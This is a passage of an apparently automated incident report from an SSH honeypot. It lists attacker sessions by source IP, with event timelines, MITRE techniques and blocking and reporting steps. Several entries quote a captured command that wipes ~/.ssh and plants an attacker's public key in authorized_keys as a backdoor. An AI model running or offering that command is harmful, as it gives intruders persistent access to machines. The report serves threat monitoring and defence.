| `2026-07-02 03:34:22` | `cowrie.client.kex` |
| `2026-07-02 03:34:24` | `cowrie.login.success` |
| `2026-07-02 03:34:26` | `cowrie.session.params` |
| `2026-07-02 03:34:26` | `cowrie.command.input` |
| `2026-07-02 03:34:27` | `cowrie.log.closed` |
| `2026-07-02 03:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df8610d79d1

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 03:35 |
| **Last Seen** | 2026-07-02 03:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:35:51` | `cowrie.session.connect` |
| `2026-07-02 03:35:52` | `cowrie.client.version` |
| `2026-07-02 03:35:52` | `cowrie.client.kex` |
| `2026-07-02 03:35:53` | `cowrie.login.success` |
| `2026-07-02 03:35:55` | `cowrie.session.params` |
| `2026-07-02 03:35:55` | `cowrie.command.input` |
| `2026-07-02 03:35:55` | `cowrie.log.closed` |
| `2026-07-02 03:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f68617195c1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:36 |
| **Last Seen** | 2026-07-02 03:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:36:58` | `cowrie.session.connect` |
| `2026-07-02 03:36:58` | `cowrie.client.version` |
| `2026-07-02 03:36:58` | `cowrie.client.kex` |
| `2026-07-02 03:36:59` | `cowrie.login.success` |
| `2026-07-02 03:37:01` | `cowrie.session.params` |
| `2026-07-02 03:37:01` | `cowrie.command.input` |
| `2026-07-02 03:37:01` | `cowrie.log.closed` |
| `2026-07-02 03:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066540d16979

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:39 |
| **Last Seen** | 2026-07-02 03:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:39:39` | `cowrie.session.connect` |
| `2026-07-02 03:39:39` | `cowrie.client.version` |
| `2026-07-02 03:39:39` | `cowrie.client.kex` |
| `2026-07-02 03:39:40` | `cowrie.login.success` |
| `2026-07-02 03:39:42` | `cowrie.session.params` |
| `2026-07-02 03:39:42` | `cowrie.command.input` |
| `2026-07-02 03:39:42` | `cowrie.log.closed` |
| `2026-07-02 03:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-225b9591068c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 03:40 |
| **Last Seen** | 2026-07-02 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:40:39` | `cowrie.session.connect` |
| `2026-07-02 03:40:39` | `cowrie.client.version` |
| `2026-07-02 03:40:39` | `cowrie.client.kex` |
| `2026-07-02 03:40:39` | `cowrie.login.success` |
| `2026-07-02 03:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9551fbdbca0f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 03:40 |
| **Last Seen** | 2026-07-02 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:40:40` | `cowrie.session.connect` |
| `2026-07-02 03:40:40` | `cowrie.client.version` |
| `2026-07-02 03:40:40` | `cowrie.client.kex` |
| `2026-07-02 03:40:40` | `cowrie.login.success` |
| `2026-07-02 03:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3a807063b5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 03:40 |
| **Last Seen** | 2026-07-02 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:40:40` | `cowrie.session.connect` |
| `2026-07-02 03:40:40` | `cowrie.client.version` |
| `2026-07-02 03:40:40` | `cowrie.client.kex` |
| `2026-07-02 03:40:40` | `cowrie.login.success` |
| `2026-07-02 03:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a6e2fc85621

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 03:40 |
| **Last Seen** | 2026-07-02 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:40:40` | `cowrie.session.connect` |
| `2026-07-02 03:40:40` | `cowrie.client.version` |
| `2026-07-02 03:40:40` | `cowrie.client.kex` |
| `2026-07-02 03:40:40` | `cowrie.login.success` |
| `2026-07-02 03:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1eb4e799a0b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 03:42 |
| **Last Seen** | 2026-07-02 03:42 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:42:26` | `cowrie.session.connect` |
| `2026-07-02 03:42:27` | `cowrie.client.version` |
| `2026-07-02 03:42:27` | `cowrie.client.kex` |
| `2026-07-02 03:42:34` | `cowrie.login.success` |
| `2026-07-02 03:42:37` | `cowrie.session.params` |
| `2026-07-02 03:42:37` | `cowrie.command.input` |
| `2026-07-02 03:42:39` | `cowrie.log.closed` |
| `2026-07-02 03:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28b4179b803

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:42 |
| **Last Seen** | 2026-07-02 03:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:42:36` | `cowrie.session.connect` |
| `2026-07-02 03:42:36` | `cowrie.client.version` |
| `2026-07-02 03:42:36` | `cowrie.client.kex` |
| `2026-07-02 03:42:36` | `cowrie.login.success` |
| `2026-07-02 03:42:39` | `cowrie.session.params` |
| `2026-07-02 03:42:39` | `cowrie.command.input` |
| `2026-07-02 03:42:39` | `cowrie.log.closed` |
| `2026-07-02 03:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-317729678212

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:05` | `cowrie.session.connect` |
| `2026-07-02 03:46:05` | `cowrie.client.version` |
| `2026-07-02 03:46:05` | `cowrie.client.kex` |
| `2026-07-02 03:46:05` | `cowrie.login.success` |
| `2026-07-02 03:46:07` | `cowrie.session.params` |
| `2026-07-02 03:46:07` | `cowrie.command.input` |
| `2026-07-02 03:46:07` | `cowrie.log.closed` |
| `2026-07-02 03:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f3f4bd029a

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:18` | `cowrie.session.connect` |
| `2026-07-02 03:46:18` | `cowrie.client.version` |
| `2026-07-02 03:46:19` | `cowrie.client.kex` |
| `2026-07-02 03:46:21` | `cowrie.login.success` |
| `2026-07-02 03:46:22` | `cowrie.session.params` |
| `2026-07-02 03:46:22` | `cowrie.command.input` |
| `2026-07-02 03:46:22` | `cowrie.command.failed` |
| `2026-07-02 03:46:23` | `cowrie.log.closed` |
| `2026-07-02 03:46:24` | `cowrie.session.params` |
| `2026-07-02 03:46:24` | `cowrie.command.input` |
| `2026-07-02 03:46:24` | `cowrie.session.file_download` |
| `2026-07-02 03:46:24` | `cowrie.log.closed` |
| `2026-07-02 03:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2761e589eb7c

| Field | Detail |
|---|---|
| **Source IP** | `185.228.135[.]197` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:19` | `cowrie.session.connect` |
| `2026-07-02 03:46:19` | `cowrie.client.version` |
| `2026-07-02 03:46:19` | `cowrie.client.kex` |
| `2026-07-02 03:46:20` | `cowrie.login.success` |
| `2026-07-02 03:46:21` | `cowrie.session.params` |
| `2026-07-02 03:46:21` | `cowrie.command.input` |
| `2026-07-02 03:46:21` | `cowrie.command.failed` |
| `2026-07-02 03:46:21` | `cowrie.log.closed` |
| `2026-07-02 03:46:22` | `cowrie.session.params` |
| `2026-07-02 03:46:22` | `cowrie.command.input` |
| `2026-07-02 03:46:22` | `cowrie.session.file_download` |
| `2026-07-02 03:46:22` | `cowrie.log.closed` |
| `2026-07-02 03:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.228.135[.]197` to AbuseIPDB if not already reported
- [ ] Block `185.228.135[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b152192c86cf

| Field | Detail |
|---|---|
| **Source IP** | `185.228.135[.]197` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:22` | `cowrie.session.connect` |
| `2026-07-02 03:46:22` | `cowrie.client.version` |
| `2026-07-02 03:46:23` | `cowrie.client.kex` |
| `2026-07-02 03:46:23` | `cowrie.login.success` |
| `2026-07-02 03:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.228.135[.]197` to AbuseIPDB if not already reported
- [ ] Block `185.228.135[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c4a036f2446

| Field | Detail |
|---|---|
| **Source IP** | `185.228.135[.]197` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:24` | `cowrie.session.connect` |
| `2026-07-02 03:46:24` | `cowrie.client.version` |
| `2026-07-02 03:46:24` | `cowrie.client.kex` |
| `2026-07-02 03:46:25` | `cowrie.login.success` |
| `2026-07-02 03:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.228.135[.]197` to AbuseIPDB if not already reported
- [ ] Block `185.228.135[.]197` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8565e54698ce

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:24` | `cowrie.session.connect` |
| `2026-07-02 03:46:24` | `cowrie.client.version` |
| `2026-07-02 03:46:25` | `cowrie.client.kex` |
| `2026-07-02 03:46:25` | `cowrie.login.success` |
| `2026-07-02 03:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e45bc4cc434

| Field | Detail |
|---|---|
| **Source IP** | `216.155.93[.]75` |
| **First Seen** | 2026-07-02 03:46 |
| **Last Seen** | 2026-07-02 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:46:25` | `cowrie.session.connect` |
| `2026-07-02 03:46:25` | `cowrie.client.version` |
| `2026-07-02 03:46:26` | `cowrie.client.kex` |
| `2026-07-02 03:46:26` | `cowrie.login.success` |
| `2026-07-02 03:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.155.93[.]75` to AbuseIPDB if not already reported
- [ ] Block `216.155.93[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95fd1d5e855c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]50` |
| **First Seen** | 2026-07-02 03:47 |
| **Last Seen** | 2026-07-02 03:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:47:50` | `cowrie.session.connect` |
| `2026-07-02 03:47:50` | `cowrie.client.version` |
| `2026-07-02 03:47:50` | `cowrie.client.kex` |
| `2026-07-02 03:47:52` | `cowrie.login.success` |
| `2026-07-02 03:47:53` | `cowrie.session.params` |
| `2026-07-02 03:47:53` | `cowrie.command.input` |
| `2026-07-02 03:47:53` | `cowrie.command.failed` |
| `2026-07-02 03:47:54` | `cowrie.log.closed` |
| `2026-07-02 03:47:54` | `cowrie.session.params` |
| `2026-07-02 03:47:54` | `cowrie.command.input` |
| `2026-07-02 03:47:55` | `cowrie.session.file_download` |
| `2026-07-02 03:47:55` | `cowrie.log.closed` |
| `2026-07-02 03:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d910f2b1f1

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]50` |
| **First Seen** | 2026-07-02 03:47 |
| **Last Seen** | 2026-07-02 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:47:55` | `cowrie.session.connect` |
| `2026-07-02 03:47:55` | `cowrie.client.version` |
| `2026-07-02 03:47:55` | `cowrie.client.kex` |
| `2026-07-02 03:47:56` | `cowrie.login.success` |
| `2026-07-02 03:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29f6852a3886

| Field | Detail |
|---|---|
| **Source IP** | `101.47.159[.]50` |
| **First Seen** | 2026-07-02 03:47 |
| **Last Seen** | 2026-07-02 03:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:47:57` | `cowrie.session.connect` |
| `2026-07-02 03:47:57` | `cowrie.client.version` |
| `2026-07-02 03:47:57` | `cowrie.client.kex` |
| `2026-07-02 03:47:59` | `cowrie.login.success` |
| `2026-07-02 03:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.159[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.47.159[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035ec725263a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 03:49 |
| **Last Seen** | 2026-07-02 03:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:49:34` | `cowrie.session.connect` |
| `2026-07-02 03:49:35` | `cowrie.client.version` |
| `2026-07-02 03:49:35` | `cowrie.client.kex` |
| `2026-07-02 03:49:36` | `cowrie.login.success` |
| `2026-07-02 03:49:37` | `cowrie.session.params` |
| `2026-07-02 03:49:37` | `cowrie.command.input` |
| `2026-07-02 03:49:38` | `cowrie.log.closed` |
| `2026-07-02 03:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b2ef4b671e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 03:49 |
| **Last Seen** | 2026-07-02 03:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:49:58` | `cowrie.session.connect` |
| `2026-07-02 03:49:58` | `cowrie.client.version` |
| `2026-07-02 03:49:58` | `cowrie.client.kex` |
| `2026-07-02 03:49:59` | `cowrie.login.success` |
| `2026-07-02 03:50:01` | `cowrie.session.params` |
| `2026-07-02 03:50:01` | `cowrie.command.input` |
| `2026-07-02 03:50:01` | `cowrie.log.closed` |
| `2026-07-02 03:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2f131f0151

| Field | Detail |
|---|---|
| **Source IP** | `47.242.11[.]232` |
| **First Seen** | 2026-07-02 03:52 |
| **Last Seen** | 2026-07-02 03:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:52:10` | `cowrie.session.connect` |
| `2026-07-02 03:52:10` | `cowrie.client.version` |
| `2026-07-02 03:52:11` | `cowrie.client.kex` |
| `2026-07-02 03:52:11` | `cowrie.login.success` |
| `2026-07-02 03:52:13` | `cowrie.session.params` |
| `2026-07-02 03:52:13` | `cowrie.command.input` |
| `2026-07-02 03:52:13` | `cowrie.command.failed` |
| `2026-07-02 03:52:13` | `cowrie.log.closed` |
| `2026-07-02 03:52:14` | `cowrie.session.params` |
| `2026-07-02 03:52:14` | `cowrie.command.input` |
| `2026-07-02 03:52:14` | `cowrie.session.file_download` |
| `2026-07-02 03:52:14` | `cowrie.log.closed` |
| `2026-07-02 03:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.11[.]232` to AbuseIPDB if not already reported
- [ ] Block `47.242.11[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54e6e3138cb4

| Field | Detail |
|---|---|
| **Source IP** | `47.242.11[.]232` |
| **First Seen** | 2026-07-02 03:52 |
| **Last Seen** | 2026-07-02 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 03:52:14` | `cowrie.session.connect` |
| `2026-07-02 03:52:14` | `cowrie.client.version` |
